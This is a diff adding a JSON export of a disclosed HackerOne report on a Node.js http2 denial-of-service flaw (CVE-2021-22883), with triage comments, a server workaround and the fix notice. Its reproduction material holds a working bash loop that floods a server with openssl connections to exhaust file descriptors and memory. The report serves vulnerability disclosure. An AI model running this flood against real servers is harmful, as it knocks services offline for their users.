@@ -1,0 +1,403 @@
+{
+  "id": 1043360,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQzMzYw",
+  "url": "https://hackerone.com/reports/1043360",
+  "title": "HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-11-25T11:06:27.749Z",
+  "submitted_at": "2020-11-25T11:06:27.818Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "omicronenergy",
+    "url": "/omicronenergy",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-22883"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-03-15T08:25:43.492Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-15T08:25:43.412Z",
+  "team_member_agreed_on_going_public_at": "2021-02-23T14:45:04.082Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nNode.js http2 server is vulnerable against denial of service attacks when too many connection attempts with an 'unknownProtocol' are established. This leads to a leak of file descriptors. If a file descriptor limit is configured on the system, then the server is unable to accept new connections and prevent the process also from opening, e.g. a file. If no file descriptor limit is configured, then this lead to an excessive memory usage and cause the system to run out of memory.\n\n**Description:**\nIf an attacker can establish an arbitrary amount of connections to the server and achieves that no session is instantiated by sending data causing the `unknownProtocol` event, then the socket is immediately closed by returning an error message.\n\nIf the attacker closes the socket before this can happen or simply do not respond to the response, the node process starts leaking file descriptors and the memory consumption increases dramatically. Node will wait for the response to the `unknownProtocol` message, which will never come.\n\nTo solve this issue we registered to the `unknownProtocol` event and had to implement two things:\n\n1. Call `socket.end()` without returning data, which seems to solve the problem partially. The amount of leaked file descriptors decreased dramatically but it is still leaking.\n2. Starting a timer and force a `socket.destroy()` after the timeout.\n\nOur current workaround for the problem looks like this:\n\n```\nserver.on('unknownProtocol', socket => {\n  // Install a timeout of 10 second if the socket was\n  // not successfully closed, then destroy the socket\n  // to ensure that the underlying resources are released.\n  const timer = setTimeout(() => {\n    if (!socket.destroyed) {\n      socket.destroy();\n    }\n  }, 10000);\n  // Un-reference the timer to avoid blocking\n  // of application shutdown and clear the timeout\n  // if the socket was successfully closed.\n  timer.unref();\n\n  // ATTENTION: Do not use the cb from the end call,\n  // because this also causes leaks!\n  socket.once('close', () => clearTimeout(timer));\n\n  // Try to gracefully close the socket\n  // ATTENTION: The default implementation provides an error\n  // message to the client, but if the client does not respond\n  // this causes the graceful close to fail. Therefore the\n  // socket is closed here without any message.\n  socket.end();\n});\n```\n\nOnce the node process reached the file descriptor limit of the system it is not possible to establish any new connection to the server. Next the process cannot not do any other operations that require a new file descriptor (e.g. opening a file). If the system has no file descriptor limit, then the process will continue consuming memory until the system has none left.\n\n## Steps To Reproduce:\n\nThe following steps assume you are on a linux system. Everything will run on your host system. The IP in the client is hard-coded to `127.0.0.1` and the port is `50000`. The scripts are kept as simple as possible. \n\n1. Create a file `client.sh` with the content provided in the Supporting Material section below (don't start it now)\n2. Create the Javascript file (see Supporting Material section below) and run the example server (may you want to customize the port). You can also start a non-secure server using `createServer()` if you don't have an example key or cert around.\n3. You query the file descriptors with the command provided in the Supporting Material section below. Simply replace `{PID}` with the process id of your node server.\n4. Maybe you also want to watch the memory consumption with the tool you prefer.\n5. Now you are ready to start the client script.\n\nWe initially found this issue by running the Greenbone Vulnerability Manager on our server port with the **OvenVAS default** scanner, the **Fast and ultimate** configuration with all kind of vulnerability tests enabled and the **TCP-SYN Service Ping** alive check.\n\nThe affected code that causes this issue seems to be [here](https://github.com/nodejs/node/blob/c0ac692ba786f235f9a4938f52eede751a6a73c9/lib/internal/http2/core.js#L2918-L2929).\n\nWe are running on Linux x86 with kernel v4.19.148 with node v12.19.0.\n\n## Impact:\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\n\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\n\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.\n\n## Supporting Material/References:\n\nclient.sh\n```\n#!/bin/bash\n\nrequest=\"GET / HTTP/1.1 Host: Anything\"\n\nwhile true;\ndo\n    echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &\ndone\n```\n\nJavascript File\n```\nconst http2 = require(\"http2\");\nconst fs = require(\"fs\");\n\nconst port = 50000;\n\nprocess.on('uncaughtException', error => {\n  console.log('An uncaught exception occurred:', error)\n});\n\nprocess.on('unhandledRejection', reason => {\n  console.log('An unhandled rejection occurred:', reason)\n});\n\nprocess.on('warning', warning => {\n  console.log('A process warning occurred:', warning)\n});\n\nfunction onRequest(req, res) {\n  console.log('got request')\n}\n\nconst serverOptions = {\n  key: fs.readFileSync(__dirname + \"/key.crt\"),\n  cert: fs.readFileSync(__dirname + \"/cert.crt\")\n};\n\nhttp2\n  .createSecureServer(serverOptions, onRequest)\n  .listen(port, () => {\n    console.log(\"http2 server started on port\", port);\n  })\n  .on('error', (err) => console.log(err))\n```\nQuery file descriptors command\n```\nls -l /proc/{PID}/fd | wc -l && ls -l /proc/{PID}/map_files | wc -l\n```\n\n\nIf you need anything else let us know.\n\n## Impact\n\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\n\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\n\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2021-03-25T14:45:04.449Z",
+  "allow_singular_disclosure_after": -78769842.99520698,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "salahhasoneh",
+    "demonia",
+    "makeg"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 9976661,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for the report. Looks like we can confirm this one @mcollina @mhdawson .. unfortunately I don't have the time immediately available to work on it.",
+      "automated_response": false,
+      "created_at": "2020-12-01T16:33:45.842Z",
+      "updated_at": "2020-12-01T16:33:45.842Z",
+      "actor": {
+        "username": "jasnell",
+        "cleared": false,
+        "verified": false,
+        "url": "/jasnell",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 9976663,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-12-01T16:34:14.596Z",
+      "updated_at": "2020-12-01T16:34:14.596Z",
+      "actor": {
+        "username": "jasnell",
+        "cleared": false,
+        "verified": false,
+        "url": "/jasnell",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10134615,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-12-17T16:31:47.196Z",
+      "updated_at": "2020-12-17T16:31:47.196Z",
+      "actor": {
+        "username": "dlorenc",
+        "cleared": false,
+        "verified": false,
+        "url": "/dlorenc",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10326361,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi - may I ask for an update? Are there any plans?",
+      "automated_response": false,
+      "created_at": "2021-01-11T10:49:46.824Z",
+      "updated_at": "2021-01-11T10:49:46.824Z",
+      "actor": {
+        "username": "omicronenergy",
+        "cleared": false,
+        "verified": false,
+        "url": "/omicronenergy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10334730,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@omicronenergy this is a very well written and comprehensive report. We don't yet have a volunteer to help investigate/get changes landed yet so there are no plans/timing that we can report yet.",
+      "automated_response": false,
+      "created_at": "2021-01-12T00:14:30.982Z",
+      "updated_at": "2021-01-12T00:14:30.982Z",
+      "actor": {
+        "username": "mhdawson",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhdawson",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/7myewr1k3oanz3uu93r144xwxxhv/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10698459,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-02-17T14:40:48.549Z",
+      "updated_at": "2021-02-17T14:40:48.549Z",
+      "cve_ids": [
+        "CVE-2021-22883"
+      ],
+      "actor": {
+        "username": "danbev",
+        "cleared": false,
+        "verified": false,
+        "url": "/danbev",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/p1loeyp5eg3uertcvieae0lp6nch/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%22danbev.jpeg%22%3B%20filename%2A%3DUTF-8%27%27danbev.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071547Z&X-Amz-Expires=2398&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c9ba0b280cf39069a41278dc0e8be9f13bfe21355dc01b4b43bf7110308aebe5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10755103,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "@omicronenergy Thank you for the report!  This has now been included in this [security release](https://nodejs.org/en/blog/vulnerability/february-2021-security-releases/).",
+      "automated_response": false,
+      "created_at": "2021-02-23T14:39:35.348Z",
+      "updated_at": "2021-02-23T14:39:35.348Z",
+      "actor": {
+        "username": "danbev",
+        "cleared": false,
+        "verified": false,
+        "url": "/danbev",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/p1loeyp5eg3uertcvieae0lp6nch/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%22danbev.jpeg%22%3B%20filename%2A%3DUTF-8%27%27danbev.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071547Z&X-Amz-Expires=2398&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c9ba0b280cf39069a41278dc0e8be9f13bfe21355dc01b4b43bf7110308aebe5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "omicronenergy",
+        "url": "/omicronenergy"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10755215,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-02-23T14:45:04.369Z",
+      "updated_at": "2021-02-23T14:45:04.369Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "danbev",
+        "cleared": false,
+        "verified": false,
+        "url": "/danbev",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/p1loeyp5eg3uertcvieae0lp6nch/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%22danbev.jpeg%22%3B%20filename%2A%3DUTF-8%27%27danbev.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071547Z&X-Amz-Expires=2398&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c9ba0b280cf39069a41278dc0e8be9f13bfe21355dc01b4b43bf7110308aebe5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10781013,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-02-25T07:05:18.067Z",
+      "updated_at": "2021-02-25T07:05:18.067Z",
+      "actor": {
+        "url": "/nodejs",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Node.js"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "nodejs",
+      "collaborator": {
+        "username": "omicronenergy",
+        "url": "/omicronenergy"
+      }
+    },
+    {
+      "id": 10992638,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-15T08:25:43.442Z",
+      "updated_at": "2021-03-15T08:25:43.442Z",
+      "actor": {
+        "username": "omicronenergy",
+        "cleared": false,
+        "verified": false,
+        "url": "/omicronenergy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    },
+    {
+      "id": 10992639,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-15T08:25:43.555Z",
+      "updated_at": "2021-03-15T08:25:43.555Z",
+      "actor": {
+        "username": "omicronenergy",
+        "cleared": false,
+        "verified": false,
+        "url": "/omicronenergy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
